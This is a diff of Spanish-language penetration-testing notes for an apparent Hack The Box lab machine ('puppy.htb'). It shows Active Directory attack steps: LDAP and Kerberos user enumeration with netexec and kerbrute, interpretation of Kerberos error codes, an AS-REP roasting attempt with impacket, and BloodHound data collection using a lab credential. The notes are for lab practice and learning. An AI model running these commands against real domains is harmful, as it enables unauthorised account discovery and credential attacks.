@@ -60,6 +60,14 @@ Nos enumerara los usuarios del dominio
 Enumerar usuarios del dominio con [[CRACKMAPEXEC-NETEXEC]] 
 `nxc ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --users`
 
+También podemos usar [[CRACKMAPEXEC-NETEXEC]] para enumerar usuarios
+`netexec ldap $IP -u users.txt -p '' -k`
+
+ ```ad-note
+   El error KDC_ERR_PREAUTH_FAILED la contraseña no funciona pero existe el usuario
+  El error KDC_ERR_CLIENT_REVOKED existe el usuario
+ ```
+
 Para verificar y enumerar que existan en el dominio con la herramienta [[KERBRUTE]]
 `kerbrute userenum --dc $IP -d puppy.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
 
@@ -75,18 +83,10 @@ steph.cooper
 steph.cooper_adm 
 ```
 
-
-
-
- ```ad-note
-   El error KDC_ERR_PREAUTH_FAILED la contraseña no funciona pero existe el usuario
-  El error KDC_ERR_CLIENT_REVOKED existe el usuario
- ```
- 
-
+### Verificación de diferentes vectores de ataque
 
 ```ad-info
-### Verificacion de diferentes vectores de ataque
+
 #### AS-REP ROASTING (Sin creds)
 Busca obtener _hashes_ de contraseñas de usuarios que tengan deshabilitada la **preautenticación Kerberos**
 `impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
@@ -99,7 +99,7 @@ No es susceptible al ataque.
 ```
 
 
-### Recopilacion de datos de AD
+### Recopilación de datos de AD
 
 Recopilaremos unformacion del LDAP y lo guardaremos en un `.zip` que es le usaremos para subir al **BloodHound**, usaremos la herramienta [[CRACKMAPEXEC-NETEXEC]]
 `netexec ldap $IP -u 'levi.james' -p 'KingofAkron2025!' --bloodhound --collection All --dns-server $IP`
